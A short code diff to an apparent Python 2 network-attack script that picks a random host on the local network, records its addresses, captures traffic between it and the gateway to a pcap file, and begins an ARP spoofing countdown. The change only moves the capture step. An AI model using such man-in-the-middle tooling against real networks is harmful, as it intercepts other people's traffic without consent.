@@ -55,10 +55,6 @@ def attack():
 
     target = random.choice(candidates)
 
-    # Start capturing
-    filename = dt.now().strftime('%Y-%m-%d-%H-%M-%S') + '.pcap'
-    sniff(filter='ip host {} or host {}'.format(gateway_ip, target['ip']), prn=lambda x: wrpcap(filename, x))
-
     print 'Target IP address: {}'.format(target['ip'])
     print 'Target MAC address: {}'.format(target['mac'])
     print
@@ -66,7 +62,13 @@ def attack():
     # Store the original MAC addresses
     original_gateway_mac = gateway_mac
     original_target_mac = target['mac']
-
+    
+    # Start capturing
+    print 'Enabling capture, currenly broken... press Ctrl-C to continue!'
+    filename = dt.now().strftime('%Y-%m-%d-%H-%M-%S') + '.pcap'
+    sniff(filter='ip host {} or host {}'.format(gateway_ip, target['ip']), prn=lambda x: wrpcap(filename, x))
+    
+    # Start actual attack
     print 'Starting ARP spoofing attack in...',
     time.sleep(1)
     print '3...',
